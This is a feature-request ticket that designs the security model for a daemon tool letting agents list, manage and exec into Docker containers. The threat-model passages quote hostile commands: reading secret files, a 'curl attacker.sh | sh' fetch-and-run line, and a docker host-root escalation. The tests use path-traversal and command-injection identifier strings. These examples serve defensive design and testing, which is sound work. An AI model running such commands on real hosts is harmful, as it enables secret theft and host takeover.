# FR-011 Manage Docker containers: list, inspect, logs, lifecycle, exec

- **Created:** 2026-09-27, by the owner
- **Related:** `internal/tools/services/{list,manage,status}` (closest existing pattern), `internal/config/sudo.go` (`PathTools`, `paths` grant), `configs/mcp-sudo.yaml`, ARCHITECTURE.md (documented exceptions to "no CLI wrapping")

## Description

Let an agent see and manage containers on the host the same way it already manages systemd units: list, inspect one, read its logs, start/stop/restart/kill/remove, and run one command inside a running container.

**Talk to the Docker Engine API directly over its unix socket** (`/var/run/docker.sock` by default, path configurable), not by shelling out to the `docker` CLI - it's a plain HTTP/JSON API reachable with `net.Dial("unix", ...)` + stdlib `net/http`, so this needs no new dependency and fits the "parse natively" rule the same way DBus already does for systemd. Podman exposes the same API shape on its own socket and isn't a goal for v1, but nothing here should make it structurally impossible later.

**Docker must already be installed and running on the host; mcpd never installs it.** If the configured socket doesn't exist or doesn't answer, every docker/* tool fails with a clear "docker socket not found/not responding" error - same posture as `disks/health` needing `smartctl` or `services/*` needing systemd.

### Security model - this is the part that must be right before any code

Every other privileged tool in this daemon has one gate: the worker runs as the caller's OS uid unless `mcp-sudo.yaml` grants `privileged: true`, in which case (and only then) it runs as root. Docker breaks that assumption on a normal host: **membership in the `docker` group is root-equivalent** (a member can `docker run -v /:/host --privileged ...` and get a host root shell) and is entirely outside mcpd's control - some OS user the mcpd caller happens to run as might already be in that group for unrelated reasons. If a docker/* worker ever ran as the plain caller uid, a user with zero grants in `mcp-sudo.yaml` could still fully control every container on the box the moment their OS account is in `docker` group - `mcp-sudo.yaml` would show nothing and reality would show everything.

Decisions to close that:
1. **docker/* tools always require `privileged: true`, granted per user in `mcp-sudo.yaml`; there is no unprivileged fallback.** Refused outright otherwise, the same shape as stdio mode always refusing privileged rather than silently downgrading. Root reaches the socket regardless of group membership, so this costs nothing functionally and removes the ambient-group bypass entirely. This is consistency with policy already published, not a new rule: `docs/website/docs/configuration/permissions-and-risks.md` already states "**Groups count.** An account in `docker`, `lxd` or `disk` is root in all but name (it can start a privileged container, or read raw disks)". Cite that page from the docker/* tool pages rather than restating the argument.
2. **Per-container scoping, mirroring `paths:`.** Add a `containers: [name-or-ID glob, ...]` list to the grant (same place `paths` lives on `ToolPrivilege`), checked before any request reaches the socket, for every tool that names a specific container (`docker/manage`, `docker/logs`, `docker/exec`, `docker/inspect`). Absent list on an `allowed: true` grant = same "explicit refusal, not silent everywhere" rule `PathTools` already enforces for `paths` (a grant with `allowed: true` and no `containers:` is rejected in strict mode, exactly like `files/*` today).
3. **`docker/exec` is the sharpest edge - effectively remote shell access inside whatever container it targets.** No TTY/interactive attach; one command, its argv, an optional timeout, stdout+stderr captured and returned, then the exec instance is done. Every call is audit-logged with the full command.

   **Decided 2026-09-27: `containers:` is per-tool, so `docker/exec`'s allowlist is separate from `docker/manage`'s by construction.** No extra mechanism needed - `PrivilegedConfig.Tools` is already `map[string]ToolPrivilege` and `Paths` already lives on `ToolPrivilege` (`internal/config/sudo.go:22-29`), so `files/read.paths` and `files/create.paths` are independent today. Adding `Containers []string` beside `Paths` inherits that for free; a *shared* user-level list would be the option needing new code (a new field, inheritance, and a precedence rule), and it would break the symmetry with `paths:`.

   Why it has to be separate: `docker/manage restart web-1` bounces a container - disruptive, bounded, reversible. `docker/exec web-1 ...` is arbitrary code as root inside it: `cat /run/secrets/db_password`, `cat /app/.env`, `curl attacker.sh | sh`, or reaching host files through any bind-mount. A deploy agent that only needs to restart app containers must not inherit that, and the reverse case ("may exec a diagnostic in `prod-api`, may never restart it; may restart `staging-*`") is inexpressible with one list.
4. **When mcpd itself runs containerized** (VPS 9092, local k8s), reaching the *host's* Docker means bind-mounting the host's `docker.sock` into mcpd's own container - which makes mcpd's container itself root-equivalent on the host, a heavier escalation than any existing `⚠` grant. Document this loudly wherever containerized deployment is documented; don't make it the default recommendation.
5. Socket path configurable in `daemon.yaml` (default `/var/run/docker.sock`), so a non-standard install or a rootless-Docker socket path still works.

6. **`containers:` is the only gate, unlike every other allowlist in this daemon - and that changes how carefully it must be written.** For `files/*`, `paths:` is defense in depth: mcpd checks it (`IsPathAllowed`, `sudo.go:223`) *and* the kernel independently checks the worker's uid against the inode, because `spawner.go:109` runs the worker as the caller (`syscall.Credential{Uid: targetUID}`). A bug in the glob matcher still cannot read `/etc/shadow` as uid 1001. The OS is the real boundary; `mcp-sudo.yaml` only picks the uid.

   Docker has no equivalent second gate. `/var/run/docker.sock` is `srw-rw---- root docker` and the kernel's only question is whether you may open it; the Engine API has **no per-container authorization at all**. Since decision 1 makes every docker worker root (`spawner.go:74`), `containers:` is an application-level filter inside a root process with nothing behind it. Every other tool survives a bug in its filter. This one does not.

   Consequences the implementation must handle, not discover:

   - **Validate the identifier before globbing, and reject rather than clean.** The name goes into a URL path (`POST /containers/{id}/stop`), so with `containers: ["web-*"]` the string `web-1/../../db-1` *matches the glob* and resolves elsewhere. Require Docker's own charset `[a-zA-Z0-9][a-zA-Z0-9_.-]+` and refuse anything else outright.
   - **Resolve, then check - never check, then resolve.** The API takes a name, a full ID or an ID prefix for the same container, so filtering the caller's raw string lets a name glob be dodged with an ID prefix and an ID list be dodged with a name. Resolve to the canonical container first, then match both its name and its ID against the allowlist.
   - **Name-based grants are mutable.** `docker rename db-1 web-9` widens a `web-*` grant silently. mcpd never offers rename, but a human or another agent on the host can. Document that a name glob is a convenience, not a hard boundary; ID grants are stable.

7. **State the ceiling plainly in the docs, not as a `⚠` footnote.** Anyone granted a `docker/*` tool controls every container on the host, limited only by mcpd's `containers:` list. What keeps this from being *automatically* host root is that **this ticket has no `docker run`/`create`** - the classic `docker`-group escalation (`docker run -v /:/host --privileged`) is unreachable, because a caller cannot conjure a new container with host mounts. That absence is load-bearing; anything that later adds container *creation* re-opens it and is a security decision, not a feature.

   The residual ceiling: `docker/exec` into an *already existing* privileged or `/`-bind-mounting container is root on the host. Whether such a container exists is a property of the host (a CI runner, a monitoring agent, a VPN container), invisible to mcpd and outside its control - so the blast radius of this grant cannot be stated from the config alone. Say exactly that; do not imply `containers:` bounds it.

### The worker is root, like every other privileged tool (decided 2026-09-27, owner)

`privileged: true` means `targetUID, targetGID, targetGroups = 0, 0, []uint32{0}` (`internal/worker/spawner.go:74`), and docker/* uses that same path - **no dedicated account, no third uid mode.** Root reaches `/var/run/docker.sock` as its owner, so one code path works identically under systemd, in the container on VPS 9092 (whatever the bind-mounted socket's GID is inside it), in k8s, and with rootless Docker. Nothing to create at install time, nothing to degrade when there is no `docker` group.

A dedicated non-root account in the `docker` group was considered and rejected: it would narrow only the *non-docker* damage a worker bug could do, while adding a uid mode to `spawner.go`, account creation to `install.sh` and both postinstalls, and a host-GID problem in the containerized deployment. The docker blast radius would be unchanged either way, because `docker` group membership is already full docker control.

Consequence, stated once and not softened: the `containers:` allowlist and decision 6's validation rules are the *entire* boundary, enforced in application code in a root process. That is where review effort belongs - not in trimming the worker's privileges.

Dropping capabilities while staying uid 0 is not a middle option. `/var/run/docker.sock` is `srw-rw---- root docker`, so a uid-0 process reaches it as the owner by plain permission bits, with no capability involved (`CAP_DAC_OVERRIDE` is for files root does *not* own) - and the same fact is what makes capability-stripping pointless: uid 0 also owns `/etc/passwd` (0644), `/root/.ssh/authorized_keys` (0600) and `/etc/systemd/system/*.service` (0644), all writable by the owner with an empty capability set. Capabilities gate mount, ptrace, module load, chown and setuid - not "open the file you own", which is the escalation path here.

## Scope (owner's decision, 2026-09-27)

- Containers: list, inspect, logs, lifecycle (start/stop/restart/kill/pause/unpause/remove), and exec-in-container.
- Images: basic listing only (`docker/images`) - same socket, near-zero extra cost. No pull/remove/build in this ticket.
- Volumes: listing (`docker/volumes`) and `volume://{name}/inspect`. No create/remove.
- **`docker prune` is deliberately out of scope - it is FR-012.** Prune cannot be scoped by container name (it is scoped by *what kind of garbage* to collect) and needs its own `prune:` allowlist, so it gets its own tool and its own ticket. `docker/manage remove <container>` here removes one named container and nothing else; no tool in this ticket ever deletes an object the caller did not name.

## Proposed tool/resource shape (mirrors services/*)

- `docker/containers` - like `services/list`: every container (running + stopped unless filtered), name, image, state, ports, created. Filter by name pattern and state.
- `docker/manage` - like `services/manage`: `{container, action}`, action one of start/stop/restart/kill/pause/unpause/remove. Note the parallel is not exact: `services/manage` offers start/stop/restart/reload/enable/disable (`internal/tools/services/manage/manage.go:46-60`) and has **no destructive verb at all** - there is no "delete this unit". `remove` here is the one irreversible action in the tool, and the only non-POST (`DELETE /containers/{id}`), which is why it is fenced: no `force`, no `v`.
- `docker/logs` - tail/since/until, like `logs/journal-control`'s shape.
- `docker/exec` - `{container, command: [...], timeout}` → exit code, stdout, stderr.
- `docker/images` - like `docker/containers` but for images: repo, tag, ID, size, created.
- `docker/volumes` - list volumes: name, driver, mountpoint, created, in-use-by.

Resource templates (plural tool = table, singular resource = one rich object), all root-gated via `resources:` grants and `CanReadResourceAsRoot`, all served by one internal worker `docker/inspect` registered in `mcp-sudo.yaml`'s `privileged` reference block per the existing internal-worker convention (`services/status`, `files/content`):

- `container://{name}/status` - like `service://{name}/status`: a **computed** summary (state, health, exit code, restart count, uptime, image, ports, resource limits), not raw inspect. That's what makes it worth having next to `/inspect`.
- `container://{name}/inspect` - the full raw inspect JSON (`GET /containers/{id}/json`).
- `container://{name}/stats` - one-shot CPU/memory/net/block-IO snapshot (`GET /containers/{id}/stats?stream=false`), i.e. `docker stats --no-stream`.
- `container://{name}/top` - processes running inside the container (`GET /containers/{id}/top`, i.e. `docker top`): the API's `Titles` + `Processes` arrays.
- `image://{name}/inspect` - `GET /images/{name}/json`: layers, env, entrypoint, labels, size.
- `volume://{name}/inspect` - `GET /volumes/{name}`: driver, mountpoint, labels, options, scope. No `/status` - a volume has no runtime state to compute.

Grant shape in `mcp-sudo.yaml` follows the existing prefix/exact resource rules (`""` = every name under the scheme, like `file://`/`service://`/`process://`):

```yaml
resources:
  container://: ""        # any container
  image://: ""
  volume://: ""
```

## Acceptance criteria

- [ ] Tools implemented against the Docker Engine API over its unix socket, no `docker` CLI binary invoked: `docker/containers`, `docker/manage`, `docker/logs`, `docker/exec`, `docker/images`, `docker/volumes`.
- [ ] Resource templates implemented, all six served by the single internal worker `docker/inspect`: `container://{name}/status` (computed summary), `container://{name}/inspect`, `container://{name}/stats`, `container://{name}/top`, `image://{name}/inspect`, `volume://{name}/inspect`.
- [ ] `container://{name}/status` returns a computed summary (state, health, exit code, restart count, uptime, image, ports, resource limits), not raw inspect JSON - otherwise it has no reason to exist next to `/inspect`.
- [ ] All six templates registered in `internal/rpc/resources.go` and root-gated via `resources:` grants + `CanReadResourceAsRoot`; the internal `docker/inspect` worker registered in the `privileged` reference block too (the second grant a privileged template read needs, per `check_docs.sh`).
- [ ] Every docker/* tool and every resource template refuse outright without `privileged: true` granted for that specific tool/resource in `mcp-sudo.yaml` - never falls back to running as the caller's plain uid.
- [ ] `containers:` allowlist (name/ID glob) enforced for `docker/manage`, `docker/logs`, `docker/exec` and every `container://{name}/*` template read. Both halves of the `paths:` rule copied: **strict** load (`LoadSudoConfigStrict`, `linuxctl edit mcpd config sudo`) errors on `allowed: true` with no `containers:`, with a message naming the fix and `containers: ["*"]` as the explicit everywhere; **runtime** load (non-strict) accepts it but fails closed - the tool may run as root and may touch no container, exactly as `GetAllowedPaths`/`PathAllowed` return `nil`/false today. A bad grant must never be the permissive case.
- [ ] `containers: ["*"]` is the counterpart of `paths: ["/"]`: every container, but only when written out. No implicit "everywhere".
- [ ] `image://` and `volume://` reads gated by their `resources:` grants; `""` = every name under the scheme, matching the existing `file://`/`service://`/`process://` prefix rules.
- [ ] `Containers []string` added to `ToolPrivilege` beside `Paths`, so each tool's `containers:` is independent; a `docker/exec` grant and a `docker/manage` grant for the same user can name different containers, and a test proves they don't leak into each other.
- [ ] `containers:` on a tool that takes no container argument (`docker/containers`, `docker/images`, `docker/volumes`) is a strict-mode error, mirroring the existing "`paths` has no effect" check at `sudo.go:150`.
- [ ] `docker/manage remove` never sends `force=true` or `v=true` and exposes no argument that could: removing a *running* container requires `kill` then `remove` as two separate audited calls, and anonymous-volume deletion is out of scope here entirely (that is FR-012's `volumes` prune target, behind its own `prune:` allowlist). Attempting to remove a running container returns Docker's own 409 with a message naming `kill` as the next step. (`force`/`v` are *Docker's* query-parameter names on `DELETE /containers/{id}`, not ours. Should a later ticket ever expose anonymous-volume deletion, the schema argument must be spelled out - `delete_anonymous_volumes` - matching this daemon's full-word snake_case arguments (`human_readable`, `one_file_system`, `numeric_ids`); a one-letter `v` for "also destroy data" reads like a verbosity flag and must never appear in a schema here.)
- [ ] Socket missing/not responding → clear error naming the configured path, not a raw dial error.
- [ ] Socket path configurable in `daemon.yaml`, documented.
- [ ] Every call (docker/manage, docker/exec always; docker/containers read-only) audit-logged the same way as `services/manage`/`files/update`.
- [ ] `configs/mcp-sudo.yaml`'s `privileged` reference block updated with all new tools/resource, each `⚠`-marked per its actual blast radius (`docker/exec` and `docker/manage` remove/kill hardest); the containerized-mcpd socket-mount risk documented in `docs/website/docs/configuration/mcp-sudo.md` and wherever container deployment is covered.
- [ ] Docs pages for each new tool (`docs/website/docs/mcp-api/tools/docker/...`) **and each of the six resource templates**, overview list, `command-reference.md`, man page. Cite `configuration/permissions-and-risks.md`'s "Groups count" line rather than restating why docker is root-equivalent.
- [ ] `bash scripts/check_docs.sh` and `bash scripts/check_readmes.sh` pass.
- [ ] Definition of Done (backlog/README.md).

## Tests

| # | Checks | How | Expected | Run | Result |
|---|---|---|---|---|---|
| T1 | List | Go unit test against a fake Docker API (httptest unix-socket server) | containers with name/image/state/ports | | |
| T2 | Lifecycle | Go unit test: start/stop/restart/kill/pause/unpause/remove each hit the right endpoint | correct method+path per action | | |
| T3 | Exec | Go unit test: command run, stdout/stderr/exit code returned, timeout enforced | matches fake server's canned response; timeout kills the exec | | |
| T4 | No unprivileged fallback | Go unit test: no `privileged: true` grant → refused before any socket dial | "not authorized" error, no request sent | | |
| T5 | Container scoping | Go unit test: grant with `containers: ["web-*"]`, call against `db-1` | refused; `web-1` allowed | | |
| T5b | Exec and manage don't share a list | Go unit test: `docker/manage: {containers: ["staging-*"]}` + `docker/exec: {containers: ["prod-api"]}` | exec into `prod-api` allowed but restarting it refused; restarting `staging-1` allowed but exec into it refused | | |
| T5c | `containers:` where it has no effect | `ParseSudoConfig` strict: `containers:` on `docker/images` | load error, like the `paths has no effect` check at `sudo.go:150` | | |
| T5e | Identifier validation, not cleaning | Go unit test: grant `containers: ["web-*"]`, call with `web-1/../../db-1`, `web-1%2F..%2Fdb-1`, `web-1;x`, and a 64-hex ID of `db-1` | each refused *before* any socket dial, on charset grounds for the first three; the glob is never the only thing standing between the string and the API | | |
| T5f | Resolve before matching | Go unit test: grant `containers: ["web-1"]`, call with `db-1`'s ID prefix; and grant an ID, call with the name | both refused - the canonical name *and* ID are matched, not the caller's raw string | | |
| T5d | `remove` never forces | Go unit test: `docker/manage remove` against a running container on the fake API | request carries neither `force` nor `v`; 409 surfaced with a message naming `kill` first. No argument exists to override it | | |
| T6 | Strict config rejects ungated grant | `ParseSudoConfig` strict: `docker/manage: {allowed: true}` with no `containers:` | load error, like the existing `paths` check | | |
| T6b | Same grant fails closed at runtime | `ParseSudoConfig` non-strict on the T6 config, then call `docker/manage` against any container | loads without error, every call refused, no socket dial - the bad grant is inert, never permissive | | |
| T6c | Explicit everywhere | `containers: ["*"]` | every container allowed; and the absence of the key is still refusal, not `*` | | |
| T7 | Socket missing | Point `daemon.yaml` at a nonexistent socket path | clear named error, not a raw syscall error | | |
| T8 | Live: list + inspect | VPS 9091 (Docker installed for this test), real container | matches `docker ps`/`docker inspect` | | |
| T9 | Live: lifecycle | restart a throwaway container, verify new start time | matches `docker restart` | | |
| T10 | Live: exec | `docker/exec` a command in a throwaway container | stdout matches running it via `docker exec` directly | | |
| T11 | Live: boundary | call outside `containers:` grant | refused, logged as denied | | |
| T12 | Live: audit | `journalctl -u mcpd` after a manage/exec call | call logged with container name and action/command | | |
| T13 | All deployments | local k8s, VPS systemd 9091, VPS Docker 9092 | consistent behavior; 9092's own Docker-in-Docker risk noted separately, AmneziaVPN untouched | | |
| T14 | Docs | `check_docs.sh`, `check_readmes.sh` | pass | | |
| T15 | Volumes list | Go unit test, fake `GET /volumes` | name, driver, mountpoint, created, in-use-by | | |
| T16 | `container://{name}/status` is computed | Go unit test: one canned inspect response | state, health, exit code, restart count, uptime, image, ports, limits - **not** the raw JSON, and differs from `/inspect`'s output | | |
| T17 | `container://{name}/stats` | Go unit test, fake `GET /containers/{id}/stats?stream=false` | one CPU/mem/net/block-IO snapshot, returns once and does not stream | | |
| T18 | `container://{name}/top` | Go unit test, fake `GET /containers/{id}/top` | the API's `Titles` + `Processes` arrays, rendered as a table | | |
| T19 | `image://` and `volume://` inspect | Go unit test, fake `GET /images/{name}/json`, `GET /volumes/{name}` | image layers/env/entrypoint/labels/size; volume driver/mountpoint/labels/options/scope | | |
| T20 | Template grant boundary | read each of the six templates with no `resources:` grant, then with `container://: ""` only | all six refused with no grant; with only `container://` the three container reads work and `image://`/`volume://` stay refused | | |
| T21 | One worker behind all six | Review + unit test: every template read spawns `docker/inspect`, not six workers | single internal worker, registered once in the `privileged` block | | |
| T22 | Live: templates | VPS 9091, real container/image/volume | each of the six matches `docker inspect` / `docker stats --no-stream` / `docker top` / `docker volume inspect` | | |

## Comments

- 2026-09-27 - created. Owner scope decision: full read/write/exec for containers, basic listing for images. Discussed and decided before any code: docker/* must always require `privileged: true` (no ambient `docker`-group bypass through an unprivileged worker), plus a `containers:` name-glob allowlist mirroring `paths:`. `docker/exec`'s scoping (shared vs. separate allowlist from lifecycle actions) left as an open decision to make while implementing, recorded in the acceptance criteria.
- 2026-09-27 - shape filled in. Added `docker/volumes` and five more resource templates (`container://{name}/status|stats|top`, `image://{name}/inspect`, `volume://{name}/inspect`) on the plural-tool-is-a-table / singular-resource-is-one-rich-object split, all behind **one** internal `docker/inspect` worker rather than one per scheme. `container://{name}/status` is specified as a *computed* summary, not raw inspect, so it earns its place next to `/inspect`. Tests T15-T22 cover the additions. Noted that `docs/website/docs/configuration/permissions-and-risks.md` already publishes the "an account in `docker` is root in all but name" argument, so decision 1 is consistency with existing policy and the docs pages should cite that page instead of re-arguing it. Prune stated as out of scope with a pointer to FR-012. Docker **networks** are read-only and out of scope here too - FR-013, which also resolves that they cannot use `network://` (taken by host networking) and get `docker-network://` instead.
- 2026-09-27 - two scoping decisions confirmed by the owner. (a) `docker/exec` gets its own `containers:` list, separate from `docker/manage` - free, because `PrivilegedConfig.Tools` is already per-tool and `Paths` already sits on `ToolPrivilege`; a shared list would have needed new inheritance code and could not express "may exec in `prod-api`, may restart only `staging-*`". (b) `docker/manage remove` is fenced: never `force=true`, never `v=true`, no argument to override, because `services/manage` - the tool this one is modelled on - has no destructive verb at all, and `v=true` would delete anonymous volumes, which is FR-012's target behind FR-012's allowlist. Removing a running container is `kill` then `remove`: two audited decisions instead of one flag.
- 2026-09-27 - owner raised the real gap: **this daemon's rights mechanism does not apply to the docker socket.** Everywhere else `mcp-sudo.yaml` only chooses the worker's uid and the *kernel* enforces access, so an allowlist bug is survivable. The docker socket is all-or-nothing and the Engine API has no per-container authz, so with the mandatory root worker `containers:` is the only gate, in application code, with nothing behind it. Added decisions 6 (validate the identifier against Docker's charset and *reject*, never clean - `web-1/../../db-1` matches the glob `web-*`; resolve to the canonical container before matching; name globs are mutable via `docker rename`) and 7 (state the ceiling plainly: a docker grant is control of every container, and exec into an existing privileged or `/`-bind-mounting container is host root - a property of the host, not of our config). Tests T5e, T5f. The absence of `docker run`/`create` in this ticket is what stops the grant from being automatically host root and is now recorded as load-bearing, not an oversight to fill in later.
- 2026-09-27 - owner asked whether the worker is still uid 0. It is (`internal/worker/spawner.go:74`), and the owner decided it stays that way: docker/* goes through the same `privileged` path as every other tool, no dedicated `mcpd-docker` account. A non-root account in the `docker` group was weighed and rejected - it would have narrowed only the non-docker damage from a worker bug, at the price of a third uid mode in `spawner.go`, account creation in `install.sh` and both postinstalls, and a host-vs-container GID mismatch on VPS 9092; the docker blast radius is identical either way, since `docker` group membership is already full docker control. Keeping uid 0 while dropping capabilities is not a middle option: root reaches the socket as its *owner* by plain permission bits (no `CAP_DAC_OVERRIDE` involved), and uid 0 likewise owns `/etc/passwd`, `/root/.ssh/authorized_keys` and the systemd unit directory, so an empty capability set removes nothing that matters. Consequence recorded in the ticket without softening: `containers:` plus decision 6's validation rules are the entire boundary, in application code, in a root process - that is where review effort goes.
